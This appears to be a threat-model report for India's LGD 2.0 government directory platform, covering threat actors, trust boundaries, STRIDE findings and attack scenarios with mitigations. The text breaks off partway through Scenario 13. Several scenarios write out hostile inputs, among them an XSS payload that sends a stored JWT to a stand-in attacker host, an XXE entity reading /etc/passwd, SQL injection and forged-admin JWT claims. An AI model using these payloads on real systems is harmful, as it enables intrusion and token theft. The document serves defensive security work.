# LGD 2.0 - Comprehensive Threat Model & Trust Boundary Analysis Report

## Document Information
- **Project:** Local Government Directory 2.0 (LGD 2.0)
- **Phase:** Phase 1 - Threat Modeling & Trust Boundary Analysis
- **Author:** Principal Cybersecurity Architect, Threat Modeling Specialist & Senior Application Security Engineer
- **Standard Frameworks:** STRIDE, DREAD, OWASP Threat Modeling, OWASP API Security Top 10 (2023), MITRE ATT&CK, CWE, CVSS v4.0
- **Classification:** Government Confidential / Security Baseline
- **Date:** October 2026

---

## 1. Executive Summary

An exhaustive threat modeling and trust boundary assessment of the **Local Government Directory (LGD 2.0)** platform was conducted. LGD 2.0 is a national critical digital infrastructure system responsible for maintaining official codes and hierarchical relationships for States, Districts, Subdistricts, Blocks, Villages, Urban Local Bodies (ULBs), and Wards across India.

### Key Assessment Findings
1. **Architectural Perimeter Breakdown [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0 Discovery Snapshot]:** Initial deployment configurations (`docker-compose.yml`) mapped internal database (5432), cache (6379), discovery (8761), and microservice HTTP ports (`8081`, `8082`, `8083` — in active runtime topology assigned to internal container ports `18090` for Auth, `18089` for User Management, and `18062` for Revenue, with API Gateway published on host port `8092`) directly to the host network (`0.0.0.0`), allowing any external or network-adjacent attacker to bypass the API Gateway entirely. In the active runtime deployment, internal microservices (18090, 18089, 18062), Eureka (8761), PostgreSQL (5432), and Redis (6379) have their host port bindings unmapped/restricted, routing ingress exclusively via API Gateway on published host port 8092.
2. **Cryptographic Fragility [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0/1 Discovery Snapshot]:** Initial codebase inspection revealed that JWT token generation across the microservices ecosystem relied on a static, low-entropy HMAC secret key (`jwt.secret` committed in `application.properties`), enabling offline token forgery to achieve arbitrary Superadmin rights (`VULN-001` / `SAST-001` / `THR-STRIDE-001`).
   - *Current Implementation & Verification:* Remediated in code via externalization to mandatory environment variable `${JWT_SECRET}` without default fallbacks, backed by `ProductionSecurityValidator.java` enforcing >=256-bit cryptographic entropy and failing closed under the production profile. Unit tests (`JwtHardeningRegressionTest`: 14/14 PASS, `ProductionSecurityValidatorTest`: 5/5 PASS) and live dynamic testing (`EXP-001` / `EV-001`) confirm that forged tokens with static keys are rejected with HTTP 401 Unauthorized. Asymmetric RS256 migration is queued for Phase 7 under residual risk `RR-04`.
3. **Multi-Tenancy Breakdown (BOLA / IDOR) [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0/1 Discovery Snapshot]:** Initial assessment discovered that State and District boundary isolation was not enforced at the database query or service layer. Business APIs accepted user-supplied `stateCode` and `districtCode` without validating that they matched the cryptographically verified JWT identity claims (`VULN-006` / `SAST-009`, `SAST-010` / `THR-STRIDE-005`, `THR-STRIDE-019`).
   - *Current Implementation & Verification:* Remediated in code via strict server-side tenant boundary enforcement in `DistrictDraftDetailsServiceImpl.java`, `GovernmentOrderServiceImpl.java`, and `DraftEntityServiceImpl.java`, comparing draft tenant attributes directly against authenticated `UserContext` claims. Automated integration tests (`DraftTenantSecurityTest`: 5/5 PASS) and live dynamic testing (`EXP-009`, `EXP-010` / `EV-005`) confirm cross-state and cross-district viewing, file download, and deletion requests are rejected with HTTP 403 Forbidden.
4. **Unauthenticated Infrastructure Services [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0/1 Discovery Snapshot]:** Initial environment configuration left Netflix Eureka service discovery without HTTP Basic authentication (`VULN-021` / `SAST-020` / `THR-STRIDE-002`) and Redis cache without mandatory authentication or token blacklist enforcement (`VULN-007` / `SAST-012` / `THR-STRIDE-007`), exposing the platform to rogue microservice registration, MITM credential sniffing, and token blacklist invalidation.
   - *Current Implementation & Verification:* Eureka discovery is secured via Spring Security HTTP Basic authentication (`discovery/WebSecurityConfig.java`), requiring credentials sourced from `${EUREKA_USERNAME}` and `${EUREKA_PASSWORD}`; host port 8761 is unmapped in production, and dynamic verification (`EXP-020` / `EV-007A`, `EV-007B`) confirmed unauthenticated queries return HTTP 401 and authenticated registrations succeed. Redis token revocation is enforced in `api-gateway/AuthenticationFilter.java` using reactive Redis blacklist inspection failing closed (HTTP 503) during cache outages, verified live via `EXP-012` / `EV-002`. Redis host publishing is loopback-restricted to `127.0.0.1:6379:6379`, with authentication and transit encryption tracked under residual risks `RR-02` and `RR-05`.
5. **e-Hastakshar Digital Signature Vulnerabilities [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0/1 Discovery Snapshot]:** Initial assessment identified that the CDAC e-Hastakshar callback endpoint (`/api/revenue/ehastakshar/callback`) did not enforce XML signature secure validation, accepted arbitrary certificates, permitted signature bypass via configurable flags, used predictable PRNG transaction IDs, and lacked atomic replay prevention (`VULN-003` / `SAST-003`–`SAST-007` / `THR-STRIDE-003`).
   - *Current Implementation & Verification:* Remediated in code by setting `secureValidation = TRUE` in `XmlSignatureUtil.java`, enforcing CDAC trust-anchor validation and key-usage verification in `X509KeySelector.java`, defaulting signature enforcement to mandatory (`esign.enforce-signature = true`), adopting `java.security.SecureRandom` for >=64-bit entropy transaction IDs, and binding prepared PDF document hashes to transaction states with Redis distributed atomic locks (`EXP-003` through `EXP-007` / `EV-010` through `EV-014`). Verified through 22 automated tests in `EsignCallbackSecurityTest` and `EsignValidationSecurityTest` (100% PASS) and dynamic validation.

---

## 2. Assessment Scope & Target Architecture

The assessment evaluated all active codebase components, configuration files, and container deployments:

### 2.1 Evaluated Components
- **API Gateway (`api-gateway`):** Spring Cloud Gateway, published host port 8092 (internal port 8092; PRE-REMEDIATION / HISTORICAL BASELINE: 8080), handling JWT validation, rate limiting, and route forwarding.
- **Authentication Service (`auth-service`):** Spring Boot, internal container port 18090 (isolated on internal Docker network, unmapped to host; PRE-REMEDIATION / HISTORICAL BASELINE: 8081), managing user authentication, BCrypt verification, and JWT generation.
- **User Management Service (`user-management`):** Spring Boot, internal container port 18089 (isolated on internal Docker network, unmapped to host; PRE-REMEDIATION / HISTORICAL BASELINE: 8082), administering government user profiles, designations, and role assignments.
- **Revenue & Gazette Service (`revenue`):** Spring Boot, internal container port 18062 (isolated on internal Docker network, unmapped to host; PRE-REMEDIATION / HISTORICAL BASELINE: 8083), orchestrating government directory drafts, file attachments, and CDAC e-Hastakshar eSign workflows.
- **Service Discovery (`discovery`):** Netflix Eureka Server, internal container port 8761 (unmapped to host; HTTP Basic Auth enforced; PRE-REMEDIATION / HISTORICAL BASELINE: 0.0.0.0:8761 unauthenticated).
- **Frontend Applications:** `lgd_react` and `lgd-um` (React Single Page Applications).
- **Backing Infrastructure:** PostgreSQL (internal port 5432, no host-published port; PRE-REMEDIATION / HISTORICAL BASELINE: 0.0.0.0:5432) and Redis (internal port 6379, loopback 127.0.0.1:6379 only, no public host-published port; PRE-REMEDIATION / HISTORICAL BASELINE: 0.0.0.0:6379).

### 2.2 Out-of-Scope / Verified Absent Components
- **Apache Kafka:** Confirmed absent from inspected codebase and Docker configurations.
- **Mobile Applications:** No Android or Flutter codebases exist in the active repository.
- **CI/CD Automation:** No GitHub Actions or GitLab CI pipelines were detected in the repository root.

---

## 3. Threat Actor Profiles

Twelve distinct threat actors were modeled against LGD 2.0:

| Actor ID | Threat Actor | Motivation | Capabilities | Access Level | Target Assets | Likely Attack Path |
|:---|:---|:---|:---|:---|:---|:---|
| **ACT-01** | **Anonymous Internet Attacker** | Financial, disruption, cyber warfare | Automated scanners, credential stuffing, DDoS | Public internet; unauthenticated | Gateway, Actuator, exposed host ports, login APIs | Scan exposed Docker ports (5432, 6379, 8761, 8081-8083 [PRE-REMEDIATION / HISTORICAL BASELINE: 8081-8083; active internal ports: 18090, 18089, 18062; Gateway published port: 8092]); harvest credentials from Actuator `/env`; brute force `/api/auth/login`. |
| **ACT-02** | **Authenticated Malicious User** | Data theft, personal gain | Scripting, API parameter manipulation | Valid low-privilege credentials (e.g., Operator) | User profiles, draft records, internal entity IDs | Manipulate path variables (`draftId`, `userId`) to execute IDOR/BOLA; tamper with JSON payloads to escalate roles. |
| **ACT-03** | **Compromised Government Account** | Espionage, unauthorized publications | High-privilege access via stolen credentials | Valid Officer / Nodal credentials | State drafts, gazette orders, officer directories | Replay active JWTs; initiate unauthorized directory changes; approve pending state/district drafts. |
| **ACT-04** | **Malicious State-Level Officer** | Inter-state boundary manipulation | Domain expertise in LGD workflows | Valid State Officer credentials for State A | Foreign State B records, state gazette orders | Intercept API requests and replace `stateCode: 19` with `stateCode: 27` to inspect or alter neighboring state boundaries. |
| **ACT-05** | **Malicious District-Level Officer** | Unauthorized local reorganization | Knowledge of district administrative hierarchy | Valid District Officer credentials for District A | District B drafts, State-tier approvals | Bypass workflow state machine to publish drafts without State Nodal Officer approval. |
| **ACT-06** | **Privileged Administrator Abusing Permissions** | Malfeasance, corruption, sabotage | Superadmin UI & API access | Unrestricted administrative privileges | Directory master data, user role mappings, audit logs | Create covert backdoor superadmin accounts; alter audit logs or deactivate entities without justification. |
| **ACT-07** | **Compromised Microservice** | East-west lateral movement | In-cluster execution, token forwarding | Internal Docker bridge network | PostgreSQL, Redis, Eureka, peer microservices | Sniff plaintext HTTP traffic on Docker network; execute direct SQL commands; forge internal headers. |
| **ACT-08** | **Attacker with Docker Access** | Complete host / container compromise | Network sniffing, port redirection, memory inspection | Host OS or co-located container access | Environment secrets, unencrypted inter-service traffic | Exploit exposed Docker daemon or Docker network bridge; connect directly to PostgreSQL and Redis without gateway filters. [Historical Phase 0 baseline vulnerability; in active deployment, host ports 5432 and 6379 are unmapped/restricted to internal network]. |
| **ACT-09** | **Attacker with Database Access** | Data exfiltration, master data destruction | Direct SQL execution, psql client | Direct network access to port 5432 | Password hashes, user PII, gazette attachments | Connect to exposed port 5432; dump database; alter directory sequences and entity statuses. [Historical Phase 0 baseline vulnerability; in active deployment, host port 5432 is not published, service stopped during audit, access isolated to internal Docker bridge]. |
| **ACT-10** | **Attacker Targeting eSign** | Fraudulent legal gazette issuance | Cryptographic tools, XML manipulation | Man-in-the-Middle / Public endpoint access | e-Hastakshar callback, XML signatures, draft status | Send synthetic completion callbacks to `/api/revenue/ehastakshar/callback` with `status=SUCCESS` to force unauthorized gazette publication. |
| **ACT-11** | **Supply-Chain Attacker** | Persistent backdoor injection | Malicious npm / Maven packages | Upstream dependency ecosystem | Application build artifacts, server environment | Publish compromised transitive dependencies (e.g., vulnerable XML parsers or npm utilities) to execute RCE. |
| **ACT-12** | **Insider with Log Access** | Credential theft, unauthorized intelligence | Access to log aggregation / ELK / server files | Read access to `/var/log` or Gateway logs | Bearer tokens, passwords, user PII | Extract plaintext Bearer tokens from `ApiLoggingFilter` output and replay them for account takeover. |

---

## 4. Critical Asset Inventory & Data Classification

Assets within LGD 2.0 have varied sensitivity requirements and must not be treated uniformly:

| Asset Classification | Asset Description | Confidentiality Requirement | Integrity Requirement | Availability Requirement | Primary Storage Location |
|:---|:---|:---:|:---:|:---:|:---|
| **Highly Sensitive** | JWT Signing Keys (`jwt.secret`, RSA private keys) | Strict (Loss = Full Platform Takeover) | Strict | High | Environment variables / Vault |
| **Highly Sensitive** | Password Hashes (BCrypt `$2a$`) | Strict | Strict | High | PostgreSQL `users` table |
| **Highly Sensitive** | e-Hastakshar PKCS#12 Private Keys & Certs | Strict | Strict | High | Revenue service keystore |
| **Highly Sensitive** | Database Admin Credentials | Strict | Strict | High | Docker environment configs |
| **Highly Sensitive** | Redis Token Revocation Blacklist | Moderate | Strict (Tampering revives tokens) | Strict | Redis in-memory key store |
| **Confidential** | Draft Government Orders & Boundary Proposals | High (Pre-gazette embargo) | Strict | High | PostgreSQL `draft_orders` table |
| **Confidential** | Pre-Publication Attached PDF Documents | High | Strict | High | Revenue attachment storage |
| **Confidential** | User PII (Phone numbers, email, officer designations) | High | High | High | PostgreSQL `users` table |
| **Confidential** | Active JWT Bearer Tokens & Refresh Tokens | High | Strict | High | Client memory / Gateway transit |
| **Confidential** | Audit Trail Logs (`ws_access_log`, revision tables) | Moderate | Strict (Anti-tamper) | High | PostgreSQL & disk logs |
| **Internal** | Service Discovery Metadata & Routing Maps | Moderate | High | High | Eureka in-memory registry |
| **Internal** | Database Backups (pg_dump SQL files) | High | Strict | Strict | Cold storage / Staging backup |
| **Public** | Published Gazette Orders & Legal Boundary Maps | Low (Public record) | Strict (Legal authenticity) | High | PostgreSQL & CDN / Portal |
| **Public** | Active State, District, Block, Village Directory Listings | Low (Open government data) | Strict | High | PostgreSQL & Read APIs |
| **Public** | Official Language Master Tables & Postal PIN Codes | Low | High | High | PostgreSQL reference tables |

---

## 5. Trust Boundary Analysis Summary

The platform's 8 trust boundaries were systematically evaluated (detailed in [Trust_Boundary_Analysis.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/Trust_Boundary_Analysis.md)):

```
[TB-01: Internet / Public Browsers]
                │  (Public Ingress - Host Port 8092; PRE-REMEDIATION / HISTORICAL BASELINE: Port 8080)
                ▼
      ┌───────────────────┐
      │    API Gateway    │
      └─────────┬─────────┘
                │  [TB-02: Gateway to Microservices (HTTP East-West)]
                ├──────────────────────────────────────┐
                ▼                                      ▼
      ┌───────────────────┐                  ┌───────────────────┐
      │   Auth Service    │                  │  Revenue Service  │
      └─────────┬─────────┘                  └─────────┬─────────┘
                │ [TB-05: Cache]                       │ [TB-07: External eSign]
                ▼                                      ▼
      ┌───────────────────┐                  ┌───────────────────┐
      │    Redis Store    │                  │ CDAC e-Hastakshar │
      └───────────────────┘                  └───────────────────┘
                │                                      │
                ├──────────────────────────────────────┤
                ▼  [TB-04: Microservices to Database]  ▼
      ┌──────────────────────────────────────────────────────────┐
      │                  PostgreSQL Database                     │
      └──────────────────────────────────────────────────────────┘
```

- **TB-01 (Internet to Gateway):** In the pre-remediation historical baseline snapshot, perimeter controls failed due to unauthenticated host port mappings exposing all microservices and databases directly to 0.0.0.0. In the active runtime topology, API Gateway (port 8092) serves as the sole host-published ingress perimeter, with all backend microservices unmapped from host.
- **TB-02 (Gateway to Microservices):** In the historical baseline, microservices implicitly trusted incoming requests over exposed host ports. In active topology, direct host ingress is blocked (18090, 18089, 18062 unmapped), and requests route via Gateway service mesh.
- **TB-03 (User to Organizational Data):** Historical multi-tenant boundary breakdown where users could manipulate URL path variables and JSON bodies to access foreign state records; server-side tenant validation and `@PreAuthorize` method security remediate this boundary.
- **TB-04 (Microservices to PostgreSQL):** In pre-remediation baseline, database port 5432 was mapped to 0.0.0.0; in active deployment, host port publishing is removed, restricting access to internal Docker network (unencrypted transit tracked under RR-05 / TB-04).
- **TB-05 (Microservices to Redis):** In pre-remediation baseline, Redis port 6379 was exposed to 0.0.0.0 without password authentication; in active deployment, port 6379 is strictly restricted to loopback (127.0.0.1:6379) / internal Docker bridge (requirepass and TLS tracked under RR-02 / RR-05).
- **TB-06 (Microservices to Eureka):** In pre-remediation baseline, port 8761 was exposed without authentication; in active deployment, Spring Security HTTP Basic authentication is active and port 8761 is unmapped from host.
- **TB-07 (Revenue to eSign Provider):** Callback endpoint lacks HMAC verification, nonce validation, and CA trust enforcement.
- **TB-08 (Frontend to Backend):** JWT tokens stored in browser `localStorage`, creating critical vulnerability to XSS token exfiltration.

---

## 6. STRIDE Threat Analysis Across Trust Boundaries

| STRIDE Category | Core Threat Vector | Target Trust Boundary | High-Impact Finding | CWE Classification |
|:---|:---|:---|:---|:---|
| **S - Spoofing** | JWT token forgery via static HMAC secret key | `TB-01`, `TB-02` | `THR-STRIDE-001` / `VULN-001` | CWE-798 |
| **S - Spoofing** | Rogue service registration on Eureka | `TB-06` | `THR-STRIDE-002` / `VULN-021` | CWE-306 |
| **S - Spoofing** | CDAC e-Hastakshar callback injection | `TB-07` | `THR-STRIDE-003` / `VULN-003` | CWE-345 |
| **T - Tampering** | Cross-tenant draft modification (BOLA/IDOR) | `TB-03` | `THR-STRIDE-005` / `VULN-006` | CWE-639 |
| **T - Tampering** | Role & privilege injection via Mass Assignment | `TB-03` | `THR-STRIDE-006` / *[Unassigned]* | CWE-915 |
| **T - Tampering** | Token blacklist wipe via Redis `FLUSHALL` | `TB-05` | `THR-STRIDE-007` / `VULN-007` | CWE-306 |
| **R - Repudiation** | Missing entity-level change audit trails | `TB-03` | `THR-STRIDE-009` / *[Unassigned]* | CWE-778 |
| **R - Repudiation** | Log attribution confusion due to unmasked tokens | `TB-01`, `TB-02` | `THR-STRIDE-010` / `VULN-008` | CWE-532 |
| **I - Info Disclosure** | Actuator secret & environment variable harvesting | `TB-01`, `TB-02` | `THR-STRIDE-011` / *[Unassigned]* | CWE-200 |
| **I - Info Disclosure** | Direct PostgreSQL host port exposure | `TB-04` | `THR-STRIDE-012` / `VULN-009` | CWE-284 |
| **I - Info Disclosure** | Client-side JWT theft via stored XSS | `TB-08` | `THR-STRIDE-014` / *[Unassigned]* | CWE-79 |
| **D - Denial of Service** | Oversized multipart attachment upload / Zip bomb | `TB-01`, `TB-07` | `THR-STRIDE-015` / `VULN-018` | CWE-400 |
| **D - Denial of Service** | Authentication endpoint brute force flooding | `TB-01` | `THR-STRIDE-016` / `VULN-015` | CWE-307 |
| **E - Elevation of Priv** | Missing method-level `@PreAuthorize` security | `TB-03` | `THR-STRIDE-018` / `VULN-005` | CWE-285 |
| **E - Elevation of Priv** | District-to-State approval workflow bypass | `TB-03` | `THR-STRIDE-019` / `VULN-006` | CWE-269 |

---

## 7. Fifteen Critical LGD Business Attack Scenarios

### Scenario 1: State A User Accessing State B Records (BOLA / IDOR)
- **Preconditions:** Attacker possesses valid credentials as Nodal Officer for State 19 (e.g., West Bengal).
- **Attacker Capabilities:** HTTP client / proxy (Burp Suite, curl) to intercept and manipulate API traffic.
- **Attack Entry Point:** `GET /api/revenue/drafts?stateCode=27` or `GET /api/revenue/draft/{draftId}`.
- **Attack Sequence:**
  1. Authenticate to obtain valid JWT with `stateCode: 19`.
  2. Send request to `GET /api/revenue/drafts` passing `stateCode=27` (Maharashtra).
  3. Controller passes `stateCode=27` directly to Spring Data repository query.
  4. Repository executes `SELECT * FROM draft_orders WHERE state_code = 27`.
- **Target Component:** Revenue Service Controller and JPA Repository.
- **Impact:** Confidential draft gazette orders, proposed boundary modifications, and pre-release legal documents leaked.
- **Existing Security Controls:** Gateway verifies that caller has a valid JWT token.
- **Missing Controls:** Server-side tenant assertion verifying `jwt.claims.stateCode == request.stateCode`.
- **Detection Mechanism:** Log monitoring alerting on mismatch between JWT tenant claim and requested query parameter.
- **Recommended Mitigation:** Implement `TenantSecurityContext` filter binding all database lookups to verified JWT claims.

### Scenario 2: District A User Publishing District B Drafts
- **Preconditions:** Attacker has valid District Operator account for District 101.
- **Attacker Capabilities:** Ability to craft HTTP PUT/POST requests.
- **Attack Entry Point:** `PUT /api/revenue/draft/{draftId}/publish`.
- **Attack Sequence:**
  1. Identify target `draftId` belonging to neighboring District 102 via sequential enumeration.
  2. Issue `PUT /api/revenue/draft/{draftId}/publish` with valid Bearer token.
  3. Controller performs entity lookup by `draftId` without verifying `entity.districtCode == user.districtCode`.
  4. Draft is transitioned to `PUBLISHED` status in official directory.
- **Target Component:** Revenue Service Draft Workflow Controller.
- **Impact:** Unauthorized legal publication modifying district boundaries without authority.
- **Existing Security Controls:** Basic authentication filter verifies token format.
- **Missing Controls:** Entity ownership verification check prior to state machine transitions.
- **Detection Mechanism:** Audit log check comparing publishing user district against draft target district.
- **Recommended Mitigation:** Use Spring Security `@PreAuthorize("@draftSecurity.isOwner(#draftId, principal)")`.

### Scenario 3: Unauthorized User Modifying Government Directory Master Data [PRE-REMEDIATION / HISTORICAL BASELINE SCENARIO]
- **Preconditions:** Low-privilege account or unauthenticated caller exploiting exposed microservice host port (historical baseline: port 8082; active internal port: 18089).
- **Attacker Capabilities:** Direct TCP connection to backend microservice port (historically exposed host port 8082; active internal port 18089).
- **Attack Entry Point:** Direct call to `POST http://<docker-host>:8082/api/entities/village/create` (historical baseline: port 8082; active internal port: 18089).
- **Attack Sequence:**
  1. Bypass API Gateway by connecting directly to exposed host port (historical port 8082 / active internal port 18089).
  2. Submit JSON payload creating or updating village administrative records.
  3. Service executes update directly against PostgreSQL.
- **Target Component:** User Management & Entity Master Controllers.
- **Impact:** Corruption of national administrative directory hierarchy and census mapping codes.
- **Existing Security Controls:** Gateway perimeter filtering (bypassed via host port exposure).
- **Missing Controls:** Container network isolation and inter-service authentication tokens.
- **Detection Mechanism:** Network IDS detecting ingress on non-gateway ports.
- **Recommended Mitigation:** Remove host port publishing in `docker-compose.yml`; enforce mTLS or shared secret header.

### Scenario 4: User Changing Role or Privilege Identifiers in API Requests (Mass Assignment)
- **Preconditions:** Authenticated user with basic `ROLE_OPERATOR` permissions.
- **Attacker Capabilities:** JSON payload crafting.
- **Attack Entry Point:** `PUT /api/users/{userId}`.
- **Attack Sequence:**
  1. Call `PUT /api/users/current` or target user ID.
  2. Inject `"roles": ["ROLE_SUPER_ADMIN"]` into the JSON payload.
  3. Backend controller binds incoming JSON directly to the `User` persistence entity via model mapper.
  4. Entity is saved with elevated role set in PostgreSQL.
- **Target Component:** User Management Controller and User DTO.
- **Impact:** Full elevation to system superadmin; complete administrative takeover.
- **Existing Security Controls:** None on DTO field filtering.
- **Missing Controls:** Separation of UserProfileDTO (read-only roles) and AdminRoleAssignmentDTO.
- **Detection Mechanism:** Audit trigger on PostgreSQL `user_roles` table alerting on unauthorized role grant events.
- **Recommended Mitigation:** Use strict immutable DTOs without role properties for user profile endpoints.

### Scenario 5: Attacker Forging JWT Using Exposed Signing Key
- **Preconditions:** Knowledge of static `jwt.secret` from Git history or unauthenticated Actuator `/env`.
- **Attacker Capabilities:** Offline JWT token generator (e.g., jwt.io or PyJWT).
- **Attack Entry Point:** `Authorization: Bearer <forged_token>` on API Gateway.
- **Attack Sequence:**
  1. Obtain static HMAC secret from configuration or Actuator endpoint.
  2. Generate JWT with payload `{"sub": "admin", "roles": ["ROLE_SUPER_ADMIN"], "stateCode": 0}`.
  3. Sign using HMAC-SHA256 with the compromised secret.
  4. Present forged token to `/api/users` or `/api/revenue/admin`.
  5. Gateway and microservices validate signature successfully.
- **Target Component:** API Gateway & Auth Service `JwtTokenUtil`.
- **Impact:** Complete system-wide compromise; total administrative impersonation.
- **Existing Security Controls:** HMAC-SHA256 signature verification (ineffective when key is known).
- **Missing Controls:** Asymmetric RS256/Ed25519 signing, HashiCorp Vault key storage, hardware key rotation.
- **Detection Mechanism:** Token issuance anomaly detection (valid signature but no matching login in Auth audit log).
- **Recommended Mitigation:** Migrate to RS256 asymmetric keys; store private key in Vault and distribute only public key.

### Scenario 6: Attacker Reusing Revoked JWT Tokens
- **Preconditions:** Possession of a JWT token from a logged-out session.
- **Attacker Capabilities:** HTTP client replaying stored Bearer header.
- **Attack Entry Point:** Microservice API endpoints directly or via Gateway.
- **Attack Sequence:**
  1. Officer clicks "Logout" in React frontend.
  2. Auth service writes token to Redis blacklist (or fails if Redis is down/unreachable).
  3. Downstream microservice (e.g., Revenue on internal port 18062; PRE-REMEDIATION / HISTORICAL BASELINE: port 8083) receives request with logged-out token.
  4. Microservice's local `JwtAuthenticationFilter` validates token expiration and signature locally without querying Redis blacklist.
  5. Request executes successfully.
- **Target Component:** Microservice local `JwtAuthenticationFilter`.
- **Impact:** Session persistence after logout; unauthorized access via stolen browser session tokens.
- **Existing Security Controls:** Stateless JWT expiration timestamp (e.g., 24 hours).
- **Missing Controls:** Mandatory Redis blacklist lookup on every incoming request across all microservices.
- **Detection Mechanism:** Log comparison of requests accepted after user logout timestamp.
- **Recommended Mitigation:** Implement shared Redis token blacklist check in Gateway and downstream filters.

### Scenario 7: Attacker Accessing Redis and Modifying Token Blacklist Entries
- **Preconditions:** Access to Docker network or exposed host port 6379.
- **Attacker Capabilities:** Standard `redis-cli` or raw TCP client.
- **Attack Entry Point:** `tcp://<docker-host>:6379`.
- **Attack Sequence:**
  1. Connect to exposed Redis port without authentication (no password configured).
  2. Issue `FLUSHALL` or `DEL token_blacklist:*`.
  3. All recorded token revocations and rate-limit counters are immediately purged.
  4. Revoked tokens instantly regain full system validity.
- **Target Component:** Redis In-Memory Key-Value Store.
- **Impact:** Session revocation mechanism disabled; rate-limiting bypassed.
- **Existing Security Controls:** None. Redis runs with default open configuration.
- **Missing Controls:** Strong `requirepass` password and network binding to 127.0.0.1.
- **Detection Mechanism:** Redis command monitoring alerting on `FLUSHALL` / `DEL` commands.
- **Recommended Mitigation:** Enable `requirepass` with 64-character secret; isolate Redis within internal Docker bridge.

### Scenario 8: Attacker Registering a Rogue Service in Eureka
- **Preconditions:** Network access to Eureka discovery port 8761.
- **Attacker Capabilities:** HTTP POST client.
- **Attack Entry Point:** `POST http://<docker-host>:8761/eureka/apps/AUTH-SERVICE`.
- **Attack Sequence:**
  1. Send JSON registration payload to Eureka defining a rogue node for `AUTH-SERVICE`.
  2. Spring Cloud Gateway periodically fetches updated service registry from Eureka.
  3. Gateway load-balances 50% of `/api/auth/login` requests to attacker's rogue node.
  4. Attacker harvests plaintext officer usernames and passwords in bulk.
- **Target Component:** Eureka Discovery Server and API Gateway Ribbons/Load Balancer.
- **Impact:** Mass plaintext credential theft; complete man-in-the-middle compromise.
- **Existing Security Controls:** None. Eureka dashboard and REST API are completely unauthenticated.
- **Missing Controls:** Spring Security HTTP Basic authentication on Eureka discovery endpoints.
- **Detection Mechanism:** Eureka registry change listener alerting on unexpected instance IPs.
- **Recommended Mitigation:** Enforce HTTP Basic authentication on Eureka server and all discovery clients.

### Scenario 9: Attacker Submitting Forged eSign Callbacks
- **Preconditions:** Knowledge of draft `txnId` or enumeration of sequential transaction identifiers.
- **Attacker Capabilities:** HTTP POST client capable of sending multipart/form-data.
- **Attack Entry Point:** `POST /api/revenue/ehastakshar/callback`.
- **Attack Sequence:**
  1. Attacker sends synthetic POST request containing XML payload with `status="SUCCESS"` and target `txnId`.
  2. Controller parses response XML using `XmlSignatureUtil`.
  3. Service does not verify cryptographic signature of CDAC or stateful one-time token in Redis.
  4. Service updates draft status to `PUBLISHED` and generates legal notification.
- **Target Component:** Revenue Service e-Hastakshar Callback Controller.
- **Impact:** Fraudulent gazette publication without valid officer digital signature.
- **Existing Security Controls:** XML parser checks for root tag syntax.
- **Missing Controls:** Cryptographic HMAC signature check, Redis one-time nonce verification, CA root chain validation.
- **Detection Mechanism:** Verification of transaction ID against CDAC outward audit log.
- **Recommended Mitigation:** Enforce callback HMAC signature verification, single-use nonce lookup, and PDF hash audit.

### Scenario 10: Attacker Uploading Malicious XML or PDF Documents
- **Preconditions:** Authenticated user with draft creation rights.
- **Attacker Capabilities:** Crafting malicious PDF/XML files (XXE, embedded scripts, decompressed bombs).
- **Attack Entry Point:** `POST /api/revenue/attachments/upload`.
- **Attack Sequence:**
  1. Upload crafted PDF containing embedded JavaScript or XML with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`.
  2. XML parser in backend processes entity resolution without disabling external entities.
  3. File content or system secrets are leaked in error responses or parsed metadata.
- **Target Component:** Revenue Service Attachment Controller and XML Parsers.
- **Impact:** Local file inclusion (LFI), server-side request forgery (SSRF), or Denial of Service.
- **Existing Security Controls:** File extension check (`.pdf`, `.xml`).
- **Missing Controls:** `disallow-doctype-decl` enabled in XML parser; magic-byte file header verification.
- **Detection Mechanism:** Antivirus / WAF scan on uploaded multipart streams.
- **Recommended Mitigation:** Set `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; use Apache Tika for MIME validation.

### Scenario 11: Attacker Exploiting SQL Injection
- **Preconditions:** Authenticated or unauthenticated access to search/filter endpoints.
- **Attacker Capabilities:** SQL injection payload formulation.
- **Attack Entry Point:** Search parameters in entity lookups (e.g., `/api/entities/search?name=' OR 1=1--`).
- **Attack Sequence:**
  1. Identify repository methods using unparameterized native queries (`@Query(value = "...", nativeQuery = true)`).
  2. Inject SQL payloads into search/filter fields.
  3. Database executes concatenated query, leaking data or corrupting records.
- **Target Component:** Spring Data JPA Repositories (Native Queries).
- **Impact:** Bulk database exfiltration, authentication bypass, data destruction.
- **Existing Security Controls:** JPA parameterized queries used across most standard repository methods.
- **Missing Controls:** Static code analysis verification ensuring zero string concatenation in native queries.
- **Detection Mechanism:** Database query audit logging alerting on SQL syntax tokens (`UNION`, `--`, `/*`).
- **Recommended Mitigation:** Mandate parameterized JPA Specifications; prohibit string concatenation in native SQL queries.

### Scenario 12: Attacker Accessing Administrative APIs Without Proper Permissions
- **Preconditions:** Low-privilege authenticated user (e.g., District Operator).
- **Attacker Capabilities:** Direct HTTP calls to administrative endpoints.
- **Attack Entry Point:** `GET /api/users/admin/all` or `POST /api/revenue/admin/freeze-directory`.
- **Attack Sequence:**
  1. Attacker calls administrative endpoint using valid low-privilege JWT.
  2. API Gateway verifies valid token signature and forwards request.
  3. Target controller lacks `@PreAuthorize("hasRole('ADMIN')")` annotation.
  4. Method executes administrative task successfully.
- **Target Component:** User Management & Revenue Administrative Controllers.
- **Impact:** Unauthorized administrative freezes, system configuration alteration.
- **Existing Security Controls:** SecurityConfig specifies generic `.authenticated()` on API routes.
- **Missing Controls:** Granular method-level role enforcement (`@PreAuthorize`).
- **Detection Mechanism:** Gateway access logs showing operator tokens accessing `/admin/` paths.
- **Recommended Mitigation:** Enforce global `@EnableMethodSecurity` and declare role checks on all controller methods.

### Scenario 13: Attacker Stealing JWT Tokens Through Frontend Weaknesses
- **Preconditions:** Stored XSS vulnerability in local body or entity descriptions.
- **Attacker Capabilities:** JavaScript execution in victim's browser session.
- **Attack Entry Point:** Malicious script injected into village/block local name fields.
- **Attack Sequence:**
  1. Attacker submits entity with name: `<img src=x onerror="fetch('https://c2.attacker.com/steal?t='+localStorage.getItem('token'))">`.
  2. Nodal Officer views entity details in React frontend.
  3. Browser executes script; JWT token is read from `localStorage` and sent to attacker C2.
